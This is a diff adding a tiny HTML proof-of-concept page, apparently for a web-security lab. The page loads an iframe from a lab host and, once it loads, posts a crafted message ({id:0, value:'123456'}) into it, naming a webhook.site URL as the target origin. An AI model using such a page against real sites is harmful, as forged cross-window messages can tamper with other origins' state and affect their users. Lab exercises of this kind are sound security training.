@@ -1,0 +1,12 @@
+<html>
+<body>
+<script>
+
+function test() 
+{
+document.getElementById('f').contentWindow.postMessage({"id":0,"value":"123456"}, "http://webhook.site/1eece8a1-b797-4e08-8cef-797f69058c93");
+}
+</script>
+<iframe onload="test()" id="f" src="http://ptl-06056df2-5985c599.libcurl.so/"></iframe>
+</body>
+</html>
